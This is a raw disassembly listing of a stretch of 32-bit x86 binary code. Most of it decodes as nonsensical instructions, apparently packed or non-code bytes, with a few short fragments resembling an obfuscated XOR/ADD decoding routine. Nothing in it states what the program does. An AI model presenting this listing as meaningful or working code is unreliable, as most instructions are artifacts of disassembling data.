  407aa1:	ror    DWORD PTR [ecx+0x1f76aa6b],cl
  407aa7:	hlt    
  407aa8:	data16 mov dl,0x83
  407aab:	pushf  
  407aac:	cmp    al,0x3e
  407aae:	lds    ebp,FWORD PTR [ecx+0x5f]
  407ab1:	repz fs loop 0x407a9b
  407ab5:	jne    0x407aec
  407ab7:	mov    esi,0xce967a56
  407abc:	call   0xe0b31015
  407ac1:	inc    edx
  407ac2:	dec    eax
  407ac3:	lods   eax,DWORD PTR ds:[esi]
  407ac4:	mov    ds:0xba610e3b,al
  407ac9:	mov    esi,0x606ef238
  407ace:	popf   
  407acf:	jne    0x407af6
  407ad1:	repnz retf 
  407ad3:	sbb    esi,DWORD PTR [esi-0x222c7c74]
  407ad9:	fidiv  DWORD PTR [esi+esi*2+0x2b]
  407add:	dec    ebx
  407ade:	rol    esi,0x22
  407ae1:	pop    es
  407ae2:	sub    ebx,DWORD PTR [eax-0x7813af38]
  407ae8:	xor    BYTE PTR [edx+0x6f],al
  407aeb:	and    edi,esi
  407aed:	imul   ebp,DWORD PTR [eax]
  407af0:	in     eax,0x37
  407af2:	out    dx,eax
  407af3:	inc    ecx
  407af4:	push   ds
  407af5:	or     al,0x3f
  407af7:	cmp    al,0xfd
  407af9:	es stos BYTE PTR es:[edi],al
  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	mov    edi,0x59b260ec
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b27
  407b40:	je     0x407aea
  407b42:	cli    
  407b43:	stos   DWORD PTR es:[edi],eax
  407b44:	out    0xd,eax
  407b46:	dec    eax
  407b47:	inc    edi
  407b48:	repz ret 
  407b4a:	inc    ebp
  407b4b:	or     cl,0xb4
  407b4e:	xor    al,0xed
  407b50:	js     0x407ad5
  407b52:	ins    BYTE PTR es:[edi],dx
  407b53:	jecxz  0x407b79
  407b55:	stos   BYTE PTR es:[edi],al
  407b56:	fcmovb st,st(4)
  407b58:	and    DWORD PTR [esi],esp
  407b5a:	ins    DWORD PTR es:[edi],dx
  407b5b:	and    esp,DWORD PTR [ebp-0x15]
  407b5e:	in     al,0x51
  407b60:	sti    
  407b61:	cmc    
  407b62:	sahf   
  407b63:	mov    edx,DWORD PTR [di+0x30cf]
  407b68:	sbb    eax,DWORD PTR [edi+eiz*2+0x62a85c1f]
  407b6f:	lea    eax,[ebp+0x24fe0beb]
  407b75:	retf   0xddf9
  407b78:	in     al,dx
  407b79:	push   0xffffffca
  407b7b:	shl    BYTE PTR [ebx+0x74],cl
  407b7e:	add    DWORD PTR [ebx],edi
  407b80:	ret    0x1834
  407b83:	int    0x2
  407b85:	int3   
  407b86:	(bad)  
  407b88:	loope  0x407bae
  407b8a:	lds    ecx,FWORD PTR [edx+0x41]
  407b8d:	sbb    bh,ah
  407b8f:	inc    ebx
  407b90:	aam    0x53
  407b92:	test   al,0x45
  407b94:	mov    BYTE PTR [ecx-0x10f184b2],cl
  407b9a:	push   esi
  407b9b:	loopne 0x407b9e
  407b9d:	pop    edi
  407b9e:	xor    cl,cl
  407ba0:	fstp   QWORD PTR fs:[edx+0x537572cf]
  407ba7:	jo     0x407b58
  407ba9:	pop    ebx
  407baa:	repnz dec esi
  407bac:	test   al,0xb7
  407bae:	or     DWORD PTR [edi-0x69],ebp
  407bb1:	cld    
  407bb2:	iret   
  407bb3:	pop    eax
  407bb4:	out    0xa8,al
  407bb6:	xor    bh,BYTE PTR ds:0xb352dcc8
  407bbc:	dec    DWORD PTR [edx-0x2b77b7a4]
  407bc2:	pusha  
  407bc3:	in     eax,0x13
  407bc5:	push   0x5a
  407bc7:	gs and eax,0x5168e28d
  407bcd:	dec    ebx
  407bce:	sbb    eax,0x2890e76a
  407bd3:	scas   al,BYTE PTR es:[edi]
  407bd4:	icebp  
  407bd5:	mov    ch,0x72
  407bd7:	mov    dh,0xf9
  407bd9:	rcr    dh,cl
  407bdb:	stc    
  407bdc:	dec    ebx
  407bdd:	push   0x53de5d04
  407be2:	add    ah,dh
  407be4:	ds jb  0x407c47
  407be7:	test   bh,bh
  407be9:	pop    edi
  407bea:	dec    ebp
  407beb:	and    al,0x29
  407bed:	int3   
  407bee:	pusha  
  407bef:	int    0xfd
  407bf1:	shl    DWORD PTR [ebx],1
  407bf3:	pop    edi
  407bf4:	sbb    BYTE PTR [ebx],bl
  407bf6:	lods   eax,DWORD PTR ds:[esi]
  407bf7:	xor    al,0xb4
  407bf9:	enter  0xc613,0xc0
  407bfd:	sub    al,0x27
  407bff:	jl     0x407bc8
  407c01:	stc    
  407c02:	jae    0x407bef
  407c04:	rcl    BYTE PTR [ecx],cl
  407c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c07:	lahf   
  407c08:	inc    ecx
  407c09:	jmp    0xd54d2d51
  407c0e:	es stos DWORD PTR es:[edi],eax
  407c10:	cmp    eax,0x5bfe8d52
  407c15:	push   0x3eafa0a0
  407c1a:	push   DWORD PTR [edi]
  407c1c:	iret   
  407c1d:	(bad)  
  407c1e:	adc    al,0x47
  407c20:	push   es
  407c21:	mov    ?,esi
  407c23:	mov    edi,eax
  407c25:	sub    eax,0xcfc55d98
  407c2a:	adc    BYTE PTR [esi],al
  407c2c:	js     0x407c1e
  407c2e:	in     al,dx
  407c2f:	or     dh,BYTE PTR [edx+0x36]
  407c32:	fdiv   QWORD PTR [edi+0x5763cd07]
  407c38:	addr16 std 
  407c3a:	jo     0x407c68
  407c3c:	xchg   edx,eax
  407c3d:	pop    es
  407c3e:	jge    0x407c4c
  407c40:	(bad)  [edx]
  407c42:	mov    edi,0x9772a366
  407c47:	popa   
  407c48:	pop    ds
  407c49:	sahf   
  407c4a:	and    dh,BYTE PTR [esi]
  407c4c:	dec    eax
  407c4d:	xor    BYTE PTR [ebx],dl
  407c4f:	or     eax,0xad45f235
  407c54:	clc    
  407c55:	xchg   ch,bh
  407c57:	popf   
  407c58:	mov    al,ds:0xe2e236b0
  407c5d:	add    al,0xf
  407c5f:	pop    ebp
  407c60:	or     BYTE PTR [edx-0x120d1cca],dl
  407c66:	outs   dx,DWORD PTR ds:[esi]
  407c67:	xchg   ebp,eax
  407c68:	sub    esp,DWORD PTR [ecx]
  407c6a:	add    BYTE PTR [edx-0x19cc3327],dl
  407c70:	dec    esp
  407c71:	nop
  407c72:	add    esp,DWORD PTR ds:0xe0969e92
  407c78:	mov    WORD PTR [edx+ebp*8],es
  407c7b:	shr    BYTE PTR [eax],cl
  407c7d:	pop    edi
  407c7e:	pop    es
  407c7f:	add    bl,BYTE PTR [eax-0x6e12fb91]
  407c85:	mov    ecx,esi
  407c87:	add    bl,BYTE PTR [esi+edx*1-0x3e8d389e]
  407c8e:	pop    es
  407c8f:	add    ch,BYTE PTR [edx]
  407c91:	adc    al,0x31
  407c93:	cmp    al,0x39
  407c95:	and    eax,0x9e44fc80
  407c9a:	in     al,dx
  407c9b:	outs   dx,BYTE PTR ds:[esi]
  407c9c:	mov    edi,0xe68ed838
  407ca1:	stc    
  407ca2:	aam    0x7d
  407ca4:	sub    ch,BYTE PTR [eax]
  407ca6:	pop    ebx
  407ca7:	push   eax
  407ca8:	rcl    BYTE PTR [esi-0x469910dd],1
  407cae:	mov    al,ds:0xa2107eb
  407cb3:	sub    ecx,DWORD PTR [ebx*4+0x46927370]
  407cba:	test   al,0x2b
  407cbc:	mov    bl,0xe4
  407cbe:	lods   al,BYTE PTR ds:[esi]
  407cbf:	clc    
  407cc0:	ret    0xf918
  407cc3:	and    dh,BYTE PTR [edi]
  407cc5:	jnp    0x407caf
  407cc7:	sbb    BYTE PTR [edi+0x6695de1a],ch
  407ccd:	add    DWORD PTR [edi-0x42683fcc],eax
  407cd3:	mov    bl,0xb
  407cd5:	mov    bl,0x5
  407cd7:	sub    BYTE PTR [esi],ah
  407cd9:	mov    dh,0x6e
  407cdb:	mov    bh,0x1b
  407cdd:	mov    ebx,0x63b3dad2
  407ce2:	scas   eax,DWORD PTR es:[edi]
  407ce3:	mov    edx,0xdda00797
  407ce8:	or     bh,BYTE PTR [ebx+0x27]
  407ceb:	push   eax
  407cec:	pop    ecx
  407ced:	dec    ecx
  407cee:	mov    BYTE PTR [edi-0x2211f237],ah
  407cf4:	frstor gs:[ecx+0x3bb26214]
  407cfb:	or     al,BYTE PTR [ecx]
  407cfd:	cmp    ebx,DWORD PTR [eax]
  407cff:	dec    ebp
  407d00:	dec    ebx
  407d01:	push   ebx
  407d02:	leave  
  407d03:	inc    esi
  407d04:	lahf   
  407d05:	cs addr16 dec edx
  407d08:	or     eax,0x93d776f5
  407d0d:	pop    es
  407d0e:	jecxz  0x407d2c
  407d10:	jnp    0x407ca7
  407d12:	or     DWORD PTR [ecx+0xa2c89ee],0x5dbac99e
  407d1c:	jmp    0x407d4c
  407d1e:	pushf  
  407d1f:	call   0x725d:0x62006be6
  407d26:	mov    eax,ds:0xc3c6dc01
  407d2b:	inc    ebx
  407d2c:	ins    DWORD PTR es:[edi],dx
  407d2d:	push   edi
  407d2e:	adc    ecx,edx
  407d30:	add    dh,dh
  407d32:	mov    eax,ds:0x1c26002a
  407d37:	xchg   ebp,eax
  407d38:	out    dx,eax
  407d39:	loopne 0x407d14
  407d3b:	mov    BYTE PTR [eax],0x14
  407d3e:	pop    edi
  407d3f:	or     edi,DWORD PTR [eax]
  407d41:	retf   0x7b6e
  407d44:	jbe    0x407dae
  407d46:	sub    BYTE PTR ds:0x3442d2f1,0xb1
  407d4d:	test   al,0x12
  407d4f:	inc    eax
  407d50:	add    eax,0xbe33e1ba
  407d55:	ror    DWORD PTR [ebx+eax*8+0x4b],cl
  407d59:	rcr    DWORD PTR [ebx],0x8b
  407d5c:	gs retf 0x8a6
  407d60:	adc    dh,bl
  407d62:	stos   DWORD PTR es:[edi],eax
  407d63:	bound  eax,QWORD PTR [edi-0x51]
  407d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d67:	jo     0x407da8
  407d69:	in     al,0xda
  407d6b:	or     eax,DWORD PTR [ecx-0x7e]
  407d6e:	cmp    al,0x91
  407d70:	ss push esp
  407d72:	xor    BYTE PTR [ecx],0xce
  407d75:	das    
  407d76:	jle    0x407d68
  407d78:	jb     0x407d48
  407d7a:	sbb    BYTE PTR [esi-0x2a],cl
  407d7d:	mov    bp,0xe2c6
  407d81:	test   DWORD PTR ss:[ecx+0x4b8c5254],esi
  407d88:	push   0xffffffc2
  407d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d8b:	dec    edi
  407d8c:	mov    edx,0x61e22316
  407d91:	fwait
  407d92:	icebp  
  407d93:	mov    al,ds:0x956ef642
  407d98:	push   edx
  407d99:	sbb    BYTE PTR [esi-0x5e0b9c65],0xa7
  407da0:	jg     0x407d53
  407da2:	arpl   WORD PTR [ecx],cx
  407da4:	dec    ebx
  407da5:	retf   0xa63c
  407da8:	push   ecx
  407da9:	int3   
  407daa:	fwait
  407dab:	and    BYTE PTR [esi+0x49],al
  407dae:	pop    ss
  407daf:	sbb    DWORD PTR [edx+edx*4+0x793d37cb],esp
  407db6:	jne    0x407da3
  407db8:	shl    edi,0x64
  407dbb:	fs or  dl,ah
  407dbe:	dec    esp
  407dbf:	(bad)  
  407dc0:	repnz cmp DWORD PTR [esi-0x31],0x262ad06c
  407dc8:	lahf   
  407dc9:	push   ebp
  407dca:	popa   
  407dcb:	push   0xffffffbf
  407dcd:	outs   dx,BYTE PTR ds:[esi]
  407dce:	std    
  407dcf:	or     DWORD PTR [eax+0x67],eax
  407dd2:	shr    al,cl
  407dd4:	inc    esp
  407dd5:	fwait
  407dd6:	es cmp eax,0xb95102d3
  407ddc:	ins    DWORD PTR es:[edi],dx
  407ddd:	push   edx
  407dde:	in     eax,dx
  407ddf:	mov    BYTE PTR [edi],ch
  407de1:	dec    eax
  407de2:	dec    ecx
  407de3:	cmp    eax,0x2c00c589
  407de8:	rcl    DWORD PTR [ebx-0x535cd598],cl
  407dee:	xor    ch,BYTE PTR [eax]
  407df0:	and    al,BYTE PTR [esi+edi*2-0x4e3da6db]
  407df7:	cdq    
  407df8:	imul   esi,DWORD PTR ds:0x66431bf5,0x573f90d5
  407e02:	inc    edx
  407e03:	repz int 0x6e
  407e06:	sar    BYTE PTR [ecx+0x7e814a70],1
  407e0c:	rol    BYTE PTR [ecx-0x336aa553],0x9d
  407e13:	int3   
  407e14:	je     0x407e35
  407e16:	mov    esp,0x41126393
  407e1b:	mov    bh,0x97
  407e1d:	in     al,dx
  407e1e:	push   ebx
  407e1f:	sbb    BYTE PTR [ebx-0x51],bl
  407e22:	outs   dx,BYTE PTR ds:[esi]
  407e23:	fdivr  QWORD PTR [esi+0x99f6a8e]
  407e29:	out    0x91,eax
  407e2b:	jmp    0x88766358
  407e30:	and    eax,0x46d6ae0b
  407e35:	fidiv  WORD PTR [esi+0x1a65d458]
  407e3b:	lods   al,BYTE PTR ds:[esi]
  407e3c:	in     al,0x83
  407e3e:	inc    esp
  407e3f:	push   edx
  407e40:	adc    ebp,ecx
  407e42:	ins    BYTE PTR es:[edi],dx
  407e43:	jecxz  0x407de5
  407e45:	nop
  407e46:	dec    edx
  407e47:	icebp  
  407e48:	jb     0x407df7
  407e4a:	stos   BYTE PTR es:[edi],al
  407e4b:	lea    edi,[ebx-0x730bea50]
  407e51:	repnz pop edi
  407e53:	aad    0xbc
  407e55:	outs   dx,DWORD PTR ds:[esi]
  407e56:	imul   BYTE PTR [edx]
  407e58:	test   eax,0x317b6d68
  407e5d:	shl    DWORD PTR [eax+0x4ab4b90e],cl
  407e63:	pop    es
  407e64:	inc    ecx
  407e65:	lods   al,BYTE PTR ds:[esi]
  407e66:	or     bh,bl
  407e68:	daa    
  407e69:	adc    ebp,esi
  407e6b:	mov    ds:0x57abd9e4,eax
  407e70:	cmp    cl,dl
  407e72:	in     eax,dx
  407e73:	call   0x260824ea
  407e78:	lea    ebx,[ecx-0x33bc24fe]
  407e7e:	xor    DWORD PTR [ebx],eax
  407e80:	mov    eax,ds:0x57a0193b
  407e85:	xlat   BYTE PTR ds:[ebx]
  407e86:	popf   
  407e87:	in     eax,dx
  407e88:	push   esp
  407e89:	(bad)  
  407e8b:	stos   DWORD PTR es:[edi],eax
  407e8c:	stos   DWORD PTR es:[edi],eax
  407e8d:	sub    al,0x61
  407e8f:	daa    
  407e90:	fmul   DWORD PTR [ecx+0x2337294d]
  407e96:	je     0x407ed1
  407e98:	push   es
  407e99:	fmul   QWORD PTR [edx]
  407e9b:	data16 (bad) 
  407e9d:	icebp  
  407e9e:	dec    ebx
  407e9f:	pop    esi
  407ea0:	xchg   ebx,eax
  407ea1:	cmp    al,bl
  407ea3:	cs icebp 
  407ea5:	fisttp DWORD PTR ss:0x6d78b29c
  407eac:	or     edx,ebx
  407eae:	outs   dx,DWORD PTR ds:[esi]
  407eaf:	mov    gs,WORD PTR [eax-0x35]
  407eb2:	(bad)  
  407eb4:	sbb    cl,BYTE PTR ds:0x9c30e74f
  407eba:	enter  0xbb68,0xe2
  407ebe:	pop    edi
  407ebf:	sar    BYTE PTR [edi+0x3aed7ff8],1
  407ec5:	sub    al,0xef
  407ec7:	icebp  
  407ec8:	fnstsw WORD PTR [eax+esi*2]
  407ecb:	or     dh,dh
  407ecd:	xchg   edx,eax
  407ece:	imul   ecx,DWORD PTR [ebx],0xcb7e3f53
  407ed4:	fwait
  407ed5:	enter  0xc710,0x57
  407ed9:	mov    dh,al
  407edb:	and    DWORD PTR [ecx+0x38],edx
  407ede:	jae    0x407ea4
  407ee0:	daa    
  407ee1:	push   cs
  407ee2:	jb     0x407e7c
  407ee4:	and    ebx,DWORD PTR [esp+eax*2-0x67]
  407ee8:	push   ecx
  407ee9:	fistp  WORD PTR [edx+0x32]
  407eec:	call   0x8327bdc8
  407ef1:	dec    eax
  407ef2:	repnz inc ecx
  407ef4:	inc    esp
  407ef5:	push   DWORD PTR [ebx-0x4c]
  407ef8:	les    edi,FWORD PTR [eax]
  407efa:	ins    BYTE PTR es:[edi],dx
  407efb:	lds    edi,FWORD PTR [eax]
  407efd:	jle    0x407ed4
  407eff:	xchg   ebp,eax
  407f00:	and    BYTE PTR [eax-0x16],dl
  407f03:	xor    ah,BYTE PTR [edx-0x8]
  407f06:	or     DWORD PTR [ebp+ebx*4-0x23380e9],esi
  407f0d:	adc    bh,bh
  407f0f:	outs   dx,BYTE PTR ds:[esi]
  407f10:	cmp    ax,WORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407f4f
  407f78:	aas    
  407f79:	shl    DWORD PTR [ecx-0x56],cl
  407f7c:	sar    BYTE PTR [esi+0x7e],cl
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407fc7
  407f84:	mov    eax,0x561e8361
  407f89:	sub    DWORD PTR [ebp+0x43ec9941],esi
  407f8f:	mov    DWORD PTR [ebp-0x10],edi
  407f92:	ds out dx,eax
  407f94:	cmp    ebx,DWORD PTR [ebp-0x4a]
  407f97:	ja     0x407f9c
  407f99:	pop    es
  407f9a:	ja     0x407fb1
  407f9c:	mov    ecx,0x832ba038
  407fa1:	add    bl,bh
  407fa3:	int    0xd6
  407fa5:	inc    ecx
  407fa6:	call   0xea1a:0x3451b95a
  407fad:	jle    0x407f7c
  407faf:	adc    al,0x0
  407fb1:	fwait
  407fb2:	ja     0x407fdb
  407fb4:	sbb    BYTE PTR [ebx+0x68],cl
  407fb7:	inc    eax
  407fb8:	jp     0x408028
  407fba:	add    ebx,ebx
  407fbc:	pop    edi
  407fbd:	jae    0x407fe4
  407fbf:	inc    ebx
  407fc0:	jmp    ebx
  407fc2:	sub    bl,BYTE PTR [edx-0x20]
  407fc5:	sub    DWORD PTR [ecx],esp
  407fc7:	jmp    0xc052:0x75a3924c
  407fce:	lods   al,BYTE PTR ds:[esi]
  407fcf:	ins    BYTE PTR es:[edi],dx
  407fd0:	dec    esi
  407fd1:	mov    bl,0xbd
  407fd3:	jne    0x407ffd
  407fd5:	scas   eax,DWORD PTR es:[edi]
  407fd6:	sub    DWORD PTR [edi+0xab13557],edx
  407fdc:	test   BYTE PTR [edi],al
  407fde:	aad    0xcd
  407fe0:	dec    eax
  407fe1:	ret    0x2106
  407fe4:	sbb    al,0x5c
  407fe6:	aad    0x23
  407fe8:	xor    al,dh
  407fea:	clc    
  407feb:	(bad)  
  407fec:	addr16 fwait
  407fee:	inc    ebp
  407fef:	cmp    eax,0x7ab8f25
  407ff4:	shr    DWORD PTR [edx-0x20],0x34
  407ff8:	mov    esp,0xd27c5e94
  407ffd:	ins    BYTE PTR es:[edi],dx
  407ffe:	cmp    DWORD PTR [ebp-0x709c69e4],edx
  408004:	out    0x41,al
  408006:	stc    
  408007:	inc    ebp
  408008:	loopne 0x407fc6
  40800a:	fdivr  DWORD PTR [ebp-0x3be82c8]
  408010:	ficomp DWORD PTR [ebp+ebx*8-0x29]
  408014:	mov    ds:0x897455f,eax
  408019:	outs   dx,DWORD PTR ds:[esi]
  40801a:	or     eax,0xfd2a05d7
  40801f:	outs   dx,BYTE PTR ds:[esi]
  408020:	int    0xe2
  408022:	jb     0x407ff0
  408024:	fst    QWORD PTR [ecx-0x3303759b]
  40802a:	mov    ebp,0xc901cbda
  40802f:	sub    eax,0xc115af1c
  408034:	cwde   
  408035:	pop    edx
  408036:	test   esi,esi
  408038:	ja     0x40809c
  40803a:	std    
  40803b:	xchg   esi,eax
  40803c:	cmp    al,0x17
  40803e:	push   ss
  40803f:	imul   edi,ebx,0x1a213f51
  408045:	scas   al,BYTE PTR es:[edi]
  408046:	lahf   
  408047:	mov    esp,0x3179162d
  40804c:	outs   dx,BYTE PTR ds:[esi]
  40804d:	in     eax,dx
  40804e:	mov    eax,ds:0xf682f5cb
  408053:	aam    0x2f
  408055:	add    edx,DWORD PTR [edx+0x3b]
  408058:	or     BYTE PTR [edx+ecx*2],ah
  40805b:	push   bp
  40805d:	xchg   esp,eax
  40805e:	mov    dh,0x4f
  408060:	sbb    esi,DWORD PTR [ebp-0x2]
  408063:	xchg   edi,eax
  408064:	shl    edi,0x78
  408067:	jbe    0x408039
  408069:	pop    edi
  40806a:	mov    al,ds:0x51419086
  40806f:	fistp  QWORD PTR [ecx]
  408071:	push   ds
  408072:	push   ds
  408073:	cmp    bl,ch
  408075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408076:	push   ss
  408077:	imul   eax,DWORD PTR [edx],0x61
  40807a:	aas    
  40807b:	in     al,dx
  40807c:	in     al,0xa8
  40807e:	out    dx,al
  40807f:	or     DWORD PTR [ebx],eax
  408081:	arpl   WORD PTR [eax-0x58aac3a0],dx
  408087:	clc    
  408088:	and    esi,DWORD PTR [edx+0x69b3b067]
  40808e:	scas   al,BYTE PTR es:[edi]
  40808f:	push   ebx
  408090:	(bad)
  408093:	es loope 0x4080fc
  408096:	cmp    ecx,DWORD PTR [ebp+0x194b714a]
  40809c:	xchg   ebp,eax
  40809d:	cld    
  40809e:	in     eax,dx
  40809f:	jmp    0xc3e3:0x7ec8a0aa
  4080a6:	mov    bl,0xae
  4080a8:	fcmovnu st,st(7)
  4080aa:	(bad)  
  4080ab:	fisub  WORD PTR [ebx-0x70]
  4080ae:	iret   
  4080af:	mov    bh,0x7
  4080b1:	sbb    al,0x64
  4080b3:	(bad)  
  4080b4:	fimul  DWORD PTR [esi-0x26]
  4080b7:	or     al,0xe7
  4080b9:	aas    
  4080ba:	js     0x4080ca
  4080bc:	sti    
  4080bd:	ja     0x408102
  4080bf:	push   ecx
  4080c0:	cmpps  xmm6,XMMWORD PTR [edx+0x5b],0xd1
  4080c5:	(bad)  
  4080c6:	out    0x3e,al
  4080c8:	repz and ecx,eax
  4080cb:	pusha  
  4080cc:	mov    ebx,0x8f492c86
  4080d1:	std    
  4080d2:	mov    esp,0xb784cda8
  4080d7:	out    dx,eax
  4080d8:	sbb    eax,0x18c4970f
  4080dd:	cmc    
  4080de:	pusha  
  4080df:	jp     0x408082
  4080e1:	loope  0x4080c6
  4080e3:	or     eax,DWORD PTR [ecx]
  4080e5:	mov    eax,ds:0xc4e79608
  4080ea:	hlt    
  4080eb:	sahf   
  4080ec:	jle    0x4080dd
  4080ee:	dec    esp
  4080ef:	(bad)  
  4080f0:	out    dx,eax
  4080f1:	pop    ds
  4080f2:	dec    eax
  4080f3:	mov    eax,ds:0x977d846b
  4080f8:	dec    ebp
  4080f9:	mov    ecx,ebx
  4080fb:	dec    esp
  4080fc:	adc    eax,0x19054a19
  408101:	nop
  408102:	sub    eax,DWORD PTR [ebp+0x4c]
  408105:	aam    0x24
  408107:	sbb    al,0xf6
  408109:	fnstsw WORD PTR [ecx]
  40810b:	or     al,0xa9
  40810d:	sbb    bh,BYTE PTR [eax]
  40810f:	pop    esi
  408110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408111:	xor    eax,0xbfb0e61b
  408116:	scas   al,BYTE PTR es:[edi]
  408117:	std    
  408118:	pop    esp
  408119:	xchg   ecx,eax
  40811a:	rcl    BYTE PTR [ebp+0x34164d09],cl
  408120:	cmp    al,BYTE PTR [ebx-0x35]
  408123:	sub    eax,0x7100f09f
  408128:	adc    BYTE PTR [esi+0x3392052b],dh
  40812e:	pusha  
  40812f:	jnp    0x4080b1
  408131:	sti    
  408132:	ja     0x4080f5
  408134:	jae    0x4080bf
  408136:	jns    0x40817b
  408138:	jnp    0x4080f7
  40813a:	or     BYTE PTR [edx+0x7a],dl
  40813d:	mov    ss,WORD PTR [ebx-0x5e]
  408140:	call   0x31b3:0x992b6737
  408147:	mov    edx,0xe7ebc21c
  40814c:	lock and ebp,DWORD PTR cs:[bx]
  408151:	lods   al,BYTE PTR ds:[esi]
  408152:	sti    
  408153:	stos   BYTE PTR es:[edi],al
  408154:	sub    BYTE PTR [eax-0x39],dh
  408157:	pop    esp
  408158:	call   0xc402a62a
  40815d:	dec    edx
  40815e:	push   edx
  40815f:	pop    es
  408160:	fisttp QWORD PTR [edx-0x6e]
  408163:	mov    ss:0x53e0f9ac,eax
  408169:	inc    edi
  40816a:	out    dx,al
  40816b:	mov    eax,0xdc0576e4
  408170:	push   ds
  408171:	lock sbb eax,0xcbaadd54
  408177:	xor    eax,ebx
  408179:	dec    eax
  40817a:	ret    
  40817b:	jnp    0x40815c
  40817d:	addr16 xchg edx,eax
  40817f:	sbb    BYTE PTR [eax],ch
  408181:	iret   
  408182:	and    DWORD PTR [edx],eax
  408184:	dec    edi
  408185:	mov    dl,0x99
  408187:	(bad)
  40818b:	fld    DWORD PTR [edi+0x6848ade2]
  408191:	lods   al,BYTE PTR ds:[esi]
  408192:	pop    ebx
  408193:	or     esp,edx
  408195:	cmp    dh,BYTE PTR [eax-0x2a06fb8c]
  40819b:	lods   eax,DWORD PTR ds:[esi]
  40819c:	loop   0x4081be
  40819e:	pop    esi
  40819f:	sub    DWORD PTR [esi+0x5697cb09],edx
  4081a5:	sbb    eax,0x6e98fe37
  4081aa:	mov    ds:0x4396aac2,al
  4081af:	(bad)  
  4081b0:	sbb    BYTE PTR [esi],dl
  4081b2:	xor    al,0xc9
  4081b4:	bound  eax,QWORD PTR [esi+0x2dafa046]
  4081ba:	jmp    0x22ea:0x2c8fa2b9
  4081c1:	mov    eax,DWORD PTR [edi-0x5ec39df9]
  4081c7:	mov    dh,0x3d
  4081c9:	ficomp DWORD PTR [edx+0x7afdfd7f]
  4081cf:	xchg   edx,eax
  4081d0:	or     bl,BYTE PTR [edx+0x7cf9f08c]
  4081d6:	psubq  mm0,QWORD PTR [esi]
  4081d9:	fnstenv [esp+edi*4+0xc]
  4081dd:	push   0xffffffce
  4081df:	push   ebx
  4081e0:	or     DWORD PTR [esp+ebp*1+0x4],edx
  4081e4:	leave  
  4081e5:	imul   ecx,DWORD PTR [edx],0xfffffff5
  4081e8:	fcmovb st,st(6)
  4081ea:	out    0xf7,al
  4081ec:	pop    ss
  4081ed:	clc    
  4081ee:	into   
  4081ef:	int    0xc8
  4081f1:	jnp    0x4081ad
  4081f3:	popa   
  4081f4:	mov    edi,0xc1f5e32e
  4081f9:	mov    bh,dl
  4081fb:	sti    
  4081fc:	loop   0x4081c3
  4081fe:	pop    edx
  4081ff:	gs ins DWORD PTR es:[edi],dx
  408201:	xor    BYTE PTR [edx+0x38],al
  408204:	jno    0x408211
  408206:	mov    eax,ecx
  408208:	cmp    eax,0x7c7c83a9
  40820d:	loop   0x4081a8
  40820f:	mov    ebx,0x546d8531
  408214:	popaw  
  408216:	push   eax
  408217:	xor    al,0x85
  408219:	mov    edi,0xd1dd1784
  40821e:	hlt    
  40821f:	adc    DWORD PTR [ecx-0x38],ecx
  408222:	add    eax,0x74dc3a2f
  408227:	bound  edx,QWORD PTR [edi-0x2a]
  40822a:	mov    ch,0xbc
  40822c:	in     eax,dx
  40822d:	adc    al,0x7
  40822f:	mov    cl,0xdd
  408231:	sbb    edx,DWORD PTR [ebp+0x48]
  408234:	fs mov esp,0x67819d90
  40823a:	nop
  40823b:	jae    0x4081d4
  40823d:	(bad)  
  40823e:	lds    ecx,FWORD PTR ds:[ecx+0x33e60f87]
  408245:	jle    0x408201
  408247:	lock dec ebx
  408249:	stc    
  40824a:	add    ebp,DWORD PTR [eax]
  40824c:	loopne 0x4081d3
  40824e:	fisttp WORD PTR [ecx]
  408250:	out    dx,eax
  408251:	call   0x10e2:0x52665166
  408258:	pushf  
  408259:	stos   DWORD PTR es:[edi],eax
  40825a:	imul   ebp,edx,0x5c
  40825d:	jns    0x408265
  40825f:	retf   0x41e1
  408262:	adc    BYTE PTR [ebp-0x40ce3911],cl
  408268:	in     al,0xca
